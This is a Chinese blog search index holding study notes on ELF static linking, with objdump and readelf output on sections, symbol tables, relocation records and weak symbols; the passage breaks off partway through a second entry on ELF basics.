<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ELF之链接初探</title>
    <url>/2024/08/15/ELF%E4%B9%8B%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5/</url>
    <content><![CDATA[<h1 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* a.c */</span></span><br><span class="line"><span class="type">int</span> shared = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> shared;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line">    swap(&amp;a, &amp;shared);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*b.c*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b)</span> &#123;</span><br><span class="line">    *b ^= *a ^= *b ^= *a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="链接过程"><a href="#链接过程" class="headerlink" title="链接过程"></a>链接过程</h1><blockquote>
<p>主要分为两步：</p>
<p>1.空间和地址分配</p>
<p>2.符号解析和重定位</p>
</blockquote>
<h2 id="空间和地址分配"><a href="#空间和地址分配" class="headerlink" title="空间和地址分配"></a>空间和地址分配</h2><blockquote>
<p>主要涉及到相似节合并和虚拟地址空间的分配以及映射关系的建立,可以观察到VMA在链接之后被分配</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++<span class="meta"># objdump -h ab</span></span><br><span class="line"></span><br><span class="line">ab:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">  <span class="number">0</span> .note.gnu.property <span class="number">00000020</span>  <span class="number">00000000004001</span>c8  <span class="number">00000000004001</span>c8  <span class="number">000001</span>c8  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  <span class="number">1</span> .text         <span class="number">00000084</span>  <span class="number">0000000000401000</span>  <span class="number">0000000000401000</span>  <span class="number">00001000</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br><span class="line">  <span class="number">2</span> .eh_frame     <span class="number">00000058</span>  <span class="number">0000000000402000</span>  <span class="number">0000000000402000</span>  <span class="number">00002000</span>  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  <span class="number">3</span> .data         <span class="number">00000004</span>  <span class="number">0000000000404000</span>  <span class="number">0000000000404000</span>  <span class="number">00003000</span>  <span class="number">2</span>**<span class="number">2</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  <span class="number">4</span> .comment      <span class="number">0000002b</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">00003004</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, READONLY</span><br><span class="line">root@L:/home/l/c++<span class="meta"># objdump -h a.o</span></span><br><span class="line"></span><br><span class="line">a.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">  <span class="number">0</span> .text         <span class="number">00000035</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">00000040</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, RELOC, READONLY, CODE</span><br><span class="line">  <span class="number">1</span> .data         <span class="number">00000004</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">00000078</span>  <span class="number">2</span>**<span class="number">2</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  <span class="number">2</span> .bss          <span class="number">00000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000007</span>c  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  ALLOC</span><br><span class="line">  <span class="number">3</span> .comment      <span class="number">0000002</span>c  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000007</span>c  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, READONLY</span><br><span class="line">  <span class="number">4</span> .note.GNU-<span class="built_in">stack</span> <span class="number">00000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">000000</span>a8  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, READONLY</span><br><span class="line">  <span class="number">5</span> .note.gnu.property <span class="number">00000020</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">000000</span>a8  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  <span class="number">6</span> .eh_frame     <span class="number">00000038</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">000000</span>c8  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, RELOC, READONLY, DATA</span><br><span class="line">root@L:/home/l/c++<span class="meta"># objdump -h b.o</span></span><br><span class="line"></span><br><span class="line">b.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">  <span class="number">0</span> .text         <span class="number">0000004f</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">00000040</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br><span class="line">  <span class="number">1</span> .data         <span class="number">00000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000008f</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  <span class="number">2</span> .bss          <span class="number">00000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000008f</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  ALLOC</span><br><span class="line">  <span class="number">3</span> .comment      <span class="number">0000002</span>c  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000008f</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, READONLY</span><br><span class="line">  <span class="number">4</span> .note.GNU-<span class="built_in">stack</span> <span class="number">00000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">000000b</span>b  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, READONLY</span><br><span class="line">  <span class="number">5</span> .note.gnu.property <span class="number">00000020</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">000000</span>c0  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  <span class="number">6</span> .eh_frame     <span class="number">00000038</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">000000e0</span>  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, RELOC, READONLY, DATA</span><br></pre></td></tr></table></figure>

<h2 id="符号解析和重定位"><a href="#符号解析和重定位" class="headerlink" title="符号解析和重定位"></a>符号解析和重定位</h2><h3 id="先来看一下结果"><a href="#先来看一下结果" class="headerlink" title="先来看一下结果"></a>先来看一下结果</h3><blockquote>
<p>可以看到符号的地址已经变成了VMA</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++<span class="meta"># readelf -s ab</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">9</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS a.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS b.c</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000401035</span>    <span class="number">79</span> FUNC    GLOBAL DEFAULT    <span class="number">2</span> swap</span><br><span class="line">     <span class="number">4</span>: <span class="number">0000000000404000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">4</span> shared</span><br><span class="line">     <span class="number">5</span>: <span class="number">0000000000404004</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT    <span class="number">4</span> __bss_start</span><br><span class="line">     <span class="number">6</span>: <span class="number">0000000000401000</span>    <span class="number">53</span> FUNC    GLOBAL DEFAULT    <span class="number">2</span> main</span><br><span class="line">     <span class="number">7</span>: <span class="number">0000000000404004</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT    <span class="number">4</span> _edata</span><br><span class="line">     <span class="number">8</span>: <span class="number">0000000000404008</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT    <span class="number">4</span> _end</span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -s a.O</span></span><br><span class="line">readelf: Error: <span class="string">&#x27;a.O&#x27;</span>: No such file</span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -s a.o</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">6</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS a.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">1</span> .text</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000000000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">3</span> shared</span><br><span class="line">     <span class="number">4</span>: <span class="number">0000000000000000</span>    <span class="number">53</span> FUNC    GLOBAL DEFAULT    <span class="number">1</span> main</span><br><span class="line">     <span class="number">5</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND swap</span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -s b.o</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">4</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS b.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">1</span> .text</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000000000</span>    <span class="number">79</span> FUNC    GLOBAL DEFAULT    <span class="number">1</span> swap</span><br></pre></td></tr></table></figure>

<h3 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> Elf64_Xword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int64_t</span> Elf64_Sxword</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword	r_addend;		<span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure>

<h3 id="本程序实例"><a href="#本程序实例" class="headerlink" title="本程序实例"></a>本程序实例</h3><blockquote>
<p>可以用工具需要重定位的位置，这里有个问题，就是值都是地址减4感觉是个问题，call的话明明需要减去下一条指令的地址才对，有机会研究一下。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++<span class="meta"># objdump -r a.o</span></span><br><span class="line"></span><br><span class="line">a.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line">RELOCATION RECORDS FOR [.text]:</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line"><span class="number">000000000000001</span>a R_X86_64_PC32     shared<span class="number">-0x0000000000000004</span></span><br><span class="line"><span class="number">000000000000002</span>a R_X86_64_PLT32    swap<span class="number">-0x0000000000000004</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RELOCATION RECORDS FOR [.eh_frame]:</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line"><span class="number">0000000000000020</span> R_X86_64_PC32     .text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@L:/home/l/c++<span class="meta"># objdump -d a.o</span></span><br><span class="line"></span><br><span class="line">a.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;main&gt;:</span><br><span class="line">   <span class="number">0</span>:   f3 <span class="number">0f</span> <span class="number">1</span>e fa             endbr64 </span><br><span class="line">   <span class="number">4</span>:   <span class="number">55</span>                      push   %rbp</span><br><span class="line">   <span class="number">5</span>:   <span class="number">48</span> <span class="number">89</span> e5                mov    %rsp,%rbp</span><br><span class="line">   <span class="number">8</span>:   <span class="number">48</span> <span class="number">83</span> ec <span class="number">10</span>             sub    $<span class="number">0x10</span>,%rsp</span><br><span class="line">   c:   c7 <span class="number">45</span> fc <span class="number">64</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   $<span class="number">0x64</span>,<span class="number">-0x4</span>(%rbp)</span><br><span class="line">  <span class="number">13</span>:   <span class="number">48</span> <span class="number">8</span>d <span class="number">45</span> fc             lea    <span class="number">-0x4</span>(%rbp),%rax</span><br><span class="line">  <span class="number">17</span>:   <span class="number">48</span> <span class="number">8</span>d <span class="number">15</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    lea    <span class="number">0x0</span>(%rip),%rdx        # <span class="number">1</span>e &lt;main+<span class="number">0x1e</span>&gt;</span><br><span class="line">  <span class="number">1</span>e:   <span class="number">48</span> <span class="number">89</span> d6                mov    %rdx,%rsi</span><br><span class="line">  <span class="number">21</span>:   <span class="number">48</span> <span class="number">89</span> c7                mov    %rax,%rdi</span><br><span class="line">  <span class="number">24</span>:   b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">29</span>:   e8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">2</span>e &lt;main+<span class="number">0x2e</span>&gt;</span><br><span class="line">  <span class="number">2</span>e:   b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">33</span>:   c9                      leave  </span><br><span class="line">  <span class="number">34</span>:   c3                      ret    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">接下来分析一下hex的存储。</span></span><br><span class="line"><span class="comment">可以观察到偏移和append都是正确的（注意小端序）</span></span><br><span class="line"><span class="comment">具体字段ffffff fffffffffc应该是-4，到时候怎么用还得看下面</span></span><br><span class="line"><span class="comment">00000003 00000002 根据符号表的位置知道高三十二位代表索引，低32位则代表类型，盲猜类型应该根怎么重定位有关系</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -x 2 a.o</span></span><br><span class="line"></span><br><span class="line">Hex dump of section <span class="string">&#x27;.rela.text&#x27;</span>:</span><br><span class="line">  <span class="number">0x00000000</span> <span class="number">1</span>a000000 <span class="number">00000000</span> <span class="number">02000000</span> <span class="number">03000000</span> ................</span><br><span class="line">  <span class="number">0x00000010</span> fcffffff ffffffff <span class="number">2</span>a000000 <span class="number">00000000</span> ........*.......</span><br><span class="line">  <span class="number">0x00000020</span> <span class="number">04000000</span> <span class="number">05000000</span> fcffffff ffffffff ................</span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>到了这里大概已经了解了汇编到链接的粗浅的过程，虽然没有看过源码的实现，但是也粗浅猜测一下，最重要的就是节表和elf头表，这两个表看起来可以定位elf中的所有元素，节中元素只需要考虑对节的相对偏移即可，接下来的每一步操作只要维护节表和头表即可，看到这里感觉字符串表完全是可以省略的东西，但是一想链接需要名字来识别，但是可执行文件估计就可以少了好多东西。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*可以看到是有字符串表的*/</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -S ab</span></span><br><span class="line">There are <span class="number">9</span> section headers, starting at offset <span class="number">0x3188</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>             <span class="number">0000000000000000</span>  <span class="number">00000000</span></span><br><span class="line">       <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .note.gnu.pr[...] NOTE             <span class="number">00000000004001</span>c8  <span class="number">000001</span>c8</span><br><span class="line">       <span class="number">0000000000000020</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">2</span>] .text             PROGBITS         <span class="number">0000000000401000</span>  <span class="number">00001000</span></span><br><span class="line">       <span class="number">0000000000000084</span>  <span class="number">0000000000000000</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">3</span>] .eh_frame         PROGBITS         <span class="number">0000000000402000</span>  <span class="number">00002000</span></span><br><span class="line">       <span class="number">0000000000000058</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">4</span>] .data             PROGBITS         <span class="number">0000000000404000</span>  <span class="number">00003000</span></span><br><span class="line">       <span class="number">0000000000000004</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [ <span class="number">5</span>] .comment          PROGBITS         <span class="number">0000000000000000</span>  <span class="number">00003004</span></span><br><span class="line">       <span class="number">000000000000002b</span>  <span class="number">0000000000000001</span>  MS       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .symtab           SYMTAB           <span class="number">0000000000000000</span>  <span class="number">00003030</span></span><br><span class="line">       <span class="number">00000000000000</span>d8  <span class="number">0000000000000018</span>           <span class="number">7</span>     <span class="number">3</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">7</span>] .strtab           STRTAB           <span class="number">0000000000000000</span>  <span class="number">00003108</span></span><br><span class="line">       <span class="number">0000000000000032</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">8</span>] .shstrtab         STRTAB           <span class="number">0000000000000000</span>  <span class="number">0000313</span>a</span><br><span class="line">       <span class="number">000000000000004</span>d  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br><span class="line"> <span class="comment">/*可以看到是有指令可以移除字符串表的，哎，安全行业堪忧*/</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># ld a.o b.o -e main -o ab -s</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -S ab</span></span><br><span class="line">There are <span class="number">7</span> section headers, starting at offset <span class="number">0x3070</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>             <span class="number">0000000000000000</span>  <span class="number">00000000</span></span><br><span class="line">       <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .note.gnu.pr[...] NOTE             <span class="number">00000000004001</span>c8  <span class="number">000001</span>c8</span><br><span class="line">       <span class="number">0000000000000020</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">2</span>] .text             PROGBITS         <span class="number">0000000000401000</span>  <span class="number">00001000</span></span><br><span class="line">       <span class="number">0000000000000084</span>  <span class="number">0000000000000000</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">3</span>] .eh_frame         PROGBITS         <span class="number">0000000000402000</span>  <span class="number">00002000</span></span><br><span class="line">       <span class="number">0000000000000058</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">4</span>] .data             PROGBITS         <span class="number">0000000000404000</span>  <span class="number">00003000</span></span><br><span class="line">       <span class="number">0000000000000004</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [ <span class="number">5</span>] .comment          PROGBITS         <span class="number">0000000000000000</span>  <span class="number">00003004</span></span><br><span class="line">       <span class="number">000000000000002b</span>  <span class="number">0000000000000001</span>  MS       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .shstrtab         STRTAB           <span class="number">0000000000000000</span>  <span class="number">0000302f</span></span><br><span class="line">       <span class="number">000000000000003</span>d  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br></pre></td></tr></table></figure>

<h2 id="关于common"><a href="#关于common" class="headerlink" title="关于common"></a>关于common</h2><blockquote>
<p>书中也讲了弱符号同名该如何处理，将了一种common块的知识，但是目前gcc貌似弃用了这玩意，直接在bind中表明这东西是弱符号。</p>
<p>fcommon选项都不起作用了</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> ext;</span><br><span class="line"><span class="type">int</span> weak;</span><br><span class="line"><span class="type">int</span> strong = <span class="number">1</span>;</span><br><span class="line">__attribute__((weak)) <span class="type">int</span> weak2 = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> week2 = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,week2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">root@L:/home/l/c++<span class="meta"># gcc  -nostdlib -fno-exceptions -fno-unwind-tables -fno-stack-protector -fcommon -c a.c -o a.o</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -s a.o</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">10</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS a.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">1</span> .text</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">5</span> .rodata</span><br><span class="line">     <span class="number">4</span>: <span class="number">0000000000000004</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT  COM weak</span><br><span class="line">     <span class="number">5</span>: <span class="number">0000000000000000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">3</span> strong</span><br><span class="line">     <span class="number">6</span>: <span class="number">0000000000000004</span>     <span class="number">4</span> OBJECT  WEAK   DEFAULT    <span class="number">3</span> weak2</span><br><span class="line">     <span class="number">7</span>: <span class="number">0000000000000008</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">3</span> week2</span><br><span class="line">     <span class="number">8</span>: <span class="number">0000000000000000</span>    <span class="number">43</span> FUNC    GLOBAL DEFAULT    <span class="number">1</span> main</span><br><span class="line">     <span class="number">9</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND <span class="built_in">printf</span></span><br></pre></td></tr></table></figure>

<h1 id="杂记"><a href="#杂记" class="headerlink" title="杂记"></a>杂记</h1><h2 id="重复代码消除"><a href="#重复代码消除" class="headerlink" title="重复代码消除"></a><strong>重复代码消除</strong></h2><blockquote>
<p>非常高视角的讨论一下，有个印象</p>
</blockquote>
<p>c++的模板的实现，函数级别的链接，都涉及到代码的消除，否则会产生重定义的问题。具体的方法有，将不同函数放在不同的段，相同函数放在相同的段，链接的时候只保留一个。至于函数级别的链接，则涉及到无用函数的消除，但是会加大链接和汇编的成本。</p>
<h2 id="c-与ABI"><a href="#c-与ABI" class="headerlink" title="c++与ABI"></a><strong>c++与ABI</strong></h2><p>一句话来说是api是为了源码级别的兼容，在提供相应接口的os上，接口的行为是一样的。如posix标准，规定了一些列操作系统应该提供怎么样的接口的标准。而c库开发者若使用这些接口就很容易在不同的os上移植这些库。（粗显介绍）</p>
<p>至于ABI，则是应用二进制接口，就是不同的平台的二进制文件可以相互移植，基本上就是你windows的操作系统也可以处理linux的elf文件，看到这里，还是有点可能，毕竟这种文件格式的定义都是在c库中的实现，但是就算是文件结构可以合并到一起，又如何在一个机器上同时执行2种汇编代码呢？虚拟机吗？但是这不是兼容两种型号，是兼容多种型号，该如何实现？不知道了。</p>
]]></content>
      <categories>
        <category>cs</category>
        <category>读书笔记</category>
        <category>ELF</category>
      </categories>
      <tags>
        <tag>gcc</tag>
        <tag>linker</tag>
        <tag>elf</tag>
      </tags>
  </entry>
  <entry>
    <title>ELF初探</title>
    <url>/2024/08/15/ELF%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h1 id="程序示例"><a href="#程序示例" class="headerlink" title="程序示例"></a>程序示例</h1><blockquote>
<p>参照多方资料做个总结,用下方程序</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gcc -c 文件名.c，生成可重定位文件，生成的为可重定位文件，不要直接生成可执行文件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> global_init_var = <span class="number">84</span>;</span><br><span class="line"><span class="type">int</span> global_uninit_var;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">(<span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"> 